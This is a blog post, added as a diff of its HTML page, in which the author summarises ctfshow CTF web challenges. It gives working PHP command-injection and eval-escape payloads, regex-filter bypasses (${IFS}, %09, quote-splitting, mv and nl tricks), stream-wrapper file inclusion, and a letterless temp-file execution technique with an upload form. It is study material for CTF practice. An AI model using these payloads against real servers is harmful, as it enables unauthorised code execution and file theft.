@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"e1iauks.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="1.eval()函数 字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾（或者？&gt;）。 \2. file_get_contents（）函数 将整个文件读入一个字符串 \3. System（）函数（反引号&#96;&#96;和这个函数功能相同 ？可以作为通配符号） 执行外部程序，并且显示输出（可以执行Linux命令例如 ‘ls’ ‘cp flag.php 1,txt’等）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow知识点总结">
+<meta property="og:url" content="https://e1iauks.github.io/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="E1iaukのblog">
+<meta property="og:description" content="1.eval()函数 字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾（或者？&gt;）。 \2. file_get_contents（）函数 将整个文件读入一个字符串 \3. System（）函数（反引号&#96;&#96;和这个函数功能相同 ？可以作为通配符号） 执行外部程序，并且显示输出（可以执行Linux命令例如 ‘ls’ ‘cp flag.php 1,txt’等）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image009.png">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png">
+<meta property="og:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image013.png">
+<meta property="article:published_time" content="2022-02-05T12:20:57.000Z">
+<meta property="article:modified_time" content="2022-02-05T12:20:42.378Z">
+<meta property="article:author" content="E1iauk_S">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg">
+
+
+<link rel="canonical" href="https://e1iauks.github.io/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://e1iauks.github.io/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","path":"2022/02/05/ctfshow知识点总结/","title":"ctfshow知识点总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow知识点总结 | E1iaukのblog</title>
+  
+
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    (function() {
+      var host = window.location.host;
+      if (host.indexOf("127.0.0.1") == -1 && host.indexOf("localhost") == -1) {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?tug63d4s3hlw9lz2hdtfwhtl0rxay";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      }
+    })();
+  </script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">E1iaukのblog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0poc%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">构造poc执行命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BBflag"><span class="nav-number">2.</span> <span class="nav-text">直接读flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="E1iauk_S"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">E1iauk_S</p>
+  <div class="site-description" itemprop="description">卷死他们捏！</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="E1iauk_S">
+      <meta itemprop="description" content="卷死他们捏！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="E1iaukのblog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow知识点总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-02-05 20:20:57 / 修改时间：20:20:42" itemprop="dateCreated datePublished" datetime="2022-02-05T20:20:57+08:00">2022-02-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>1.eval()函数</p>
+<p>字符串按照 PHP 代码来计算。</p>
+<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾（或者？&gt;）。</p>
+<p>\2. file_get_contents（）函数</p>
+<p>将整个文件读入一个字符串</p>
+<p>\3. System（）函数（反引号``和这个函数功能相同 ？可以作为通配符号）</p>
+<p>执行外部程序，并且显示输出（可以执行Linux命令例如 ‘ls’ ‘cp flag.php 1,txt’等）</p>
+<p>4.Eval（）嵌套方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c ``= ``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  if(!``preg_match``(``&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;``, ``$c``))&#123; `</span><br><span class="line"> `    eval(``$c``); `</span><br><span class="line"> `  &#125; `</span><br><span class="line"> `   `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">此题目中过滤了很多连``的使用都是无效</span><br><span class="line">此时我们可以用eval嵌套</span><br><span class="line">eval``（$_GET[1]）；&amp;1=system（在此就不受任何过滤限制了）；</span><br><span class="line">ps``：1作为参数逃逸了出来这时候我们可以用1来干任何事情</span><br><span class="line"> </span><br><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c ``= ``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  if(!``preg_match``(``&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;``, ``$c``))&#123; `</span><br><span class="line"> `    eval(``$c``); `</span><br><span class="line"> `  &#125; `</span><br><span class="line"> `   `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">此时禁用了空格和反引号 所以得使用文件包含或者require方法然后用%0a（换行符号）代替空格符号方法如下</span><br><span class="line">?c=include/requlre%0a$_GET[1];&amp;1=``使用hackerbar上面的PHP为协议（LFI功能）查看flag.Php。(封号被禁用的话就可以用？&gt;)</span><br><span class="line"> ``可能有疑问为什么这里不用括号</span><br></pre></td></tr></table></figure>
+
+<p>`在PHP中include require echo print isset unset使用时不需要括号。```</p>
+<p>PHP伪协议总结（参考自<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087%EF%BC%89">https://segmentfault.com/a/1190000018991087）</a></p>
+<p>1.file：//协议</p>
+<p> 用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。</p>
+<p>· <strong>示例</strong>：</p>
+<ol>
+<li>file://[文件的绝对路径和文件名]</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=file://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.txt">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</a></p>
+<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="图片描述"></p>
+<ol>
+<li>[文件的相对路径和文件名]</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a></p>
+<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="图片描述"></p>
+<ol>
+<li>[http：//网络路径和文件名]</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p>
+<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="图片描述"></p>
+<p><strong>php://</strong> <strong>协议</strong></p>
+<p><strong>作用</strong>：<br> <code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
+<p>（如需了解更多请访问参考网页）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c``=``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  ``system``(``$c``.``&quot; &gt;/dev/null 2&gt;&amp;1&quot;``); `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">这道题的知识点是双写绕过黑洞</span><br><span class="line">如?c=ls;ls这样就可以正常回显解题为?c=tac flag.php;ls</span><br><span class="line">当封号被过滤时可以用ls``&amp;&amp;``（或者||）``ls``但此时&amp;&amp;要用url编码为%26（%7C）</span><br><span class="line">空格被禁时可以用$&#123;IFS&#125;或者%09（ASCII吗的水平制表符tab）来代替。在system中的空格是shell里面的空格不是PHP代码里面的空格。很多人会有疑问当禁用了数字和%后为什么我们还可以加密这是应为在url中会自动解码一次所以%09解码完毕之后就没有数字和%了。url的编码方式都是十六进制。</span><br><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c``=``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  if(!``preg_match``(``&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;``, ``$c``))&#123; `</span><br><span class="line"> `    ``system``(``$c``.``&quot; &gt;/dev/null 2&gt;&amp;1&quot;``); `</span><br><span class="line"> `  &#125; `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">此时禁用了十六进制的09和26所以此时我们不能用带有空格和&amp;的方式查看文件此时shell Linux命令中的nl命令给了我们新的方法先看nl的介绍</span><br><span class="line">将指定的各个&lt;文件&gt;添加行号标注后写到标准输出。</span><br><span class="line">所以此时我们可以使用nl/tac+&lt;+fla’’g.php||(要加密为%7C)ls</span><br><span class="line">&lt;``可以代替空格而’’（此时不支持通配符）可以绕过flag的过滤。</span><br><span class="line">这里发现一个有趣的东西就是每个字符前面加上单引号后就可以绕过正则匹配但是原因不明就是’f’l’a’g.php也是可以的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">     system(<span class="variable">$c</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;`.`</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时过滤了许多常用命令但是却没有过滤mv（用来移动文件）首先我们ls查看要查看的文件再用？c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt在访问1，txt即可。</span><br></pre></td></tr></table></figure>
+
+<p>// 你们在炫技吗？<br> if(isset($_GET[‘c’])){<br>   $c=$_GET[‘c’];<br>   if(!preg_match(“/;|[a-z]|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>     system($c);<br>   }<br> }else{<br>   highlight_file(<strong>FILE</strong>);<br> }</p>
+<p>看到这道题就会发现他禁用了数字字母&amp;和 ，但是没有过滤.和?所以此题目为无字母数字的命令执行那么我们应该怎么做呢通过查找资料我发现我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过<code>.(``点``)</code>去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020">linux</a>下面保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）（百度了一下<code>.(``点``)</code>的用法，就是相当于<code>source</code> 可以执行sh命令。）</p>
+<p>在这个之前我们需要构造一个post上传文件的数据包。</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>然后抓包</code>如图</p>
+<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png" alt="在这里插入图片描述"></p>
+<h5 id="构造poc执行命令"><a href="#构造poc执行命令" class="headerlink" title="构造poc执行命令"></a>构造poc执行命令</h5><p><code>?c=.+/???/????????[@-[]</code><br> 注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br> <img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image009.png" alt="在这里插入图片描述">然后在上传文件内容添加sh命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br><span class="line">·        1</span><br><span class="line">·        2</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png" alt="在这里插入图片描述"></p>
+<h5 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h5><p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image013.png" alt="在这里插入图片描述"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"> <i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/05/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="ctfshow知识点总结">
+                  <i class="fa fa-chevron-left"></i> ctfshow知识点总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">E1iauk_S</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+  <div id="site-runtime">
+  <span class="post-meta-item-icon">
+    <i class="fa fa-clock-o"></i>
+  </span>
+  <span id="runtime"></span>
+</div>
+
+<script language="javascript">
+  function isPC() {
+    var userAgentInfo = navigator.userAgent;
+    var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
+    for (var i = 0; i < agents.length; i++) {
+      if (userAgentInfo.indexOf(agents[i]) > 0) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function siteTime(openOnPC, start) {
+    window.setTimeout("siteTime(openOnPC, start)", 1000);
+    var seconds = 1000;
+    var minutes = seconds * 60;
+    var hours = minutes * 60;
+    var days = hours * 24;
+    var years = days * 365;
+      start = new Date("2022-1-26 19:50:00 +0800");
+    var now = new Date();
+    var year = now.getFullYear();
+    var month = now.getMonth() + 1;
+    var date = now.getDate();
+    var hour = now.getHours();
+    var minute = now.getMinutes();
+    var second = now.getSeconds();
+    var diff = now - start;
+
+    var diffYears = Math.floor(diff / years);
+    var diffDays = Math.floor((diff / days) - diffYears * 365);
+    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
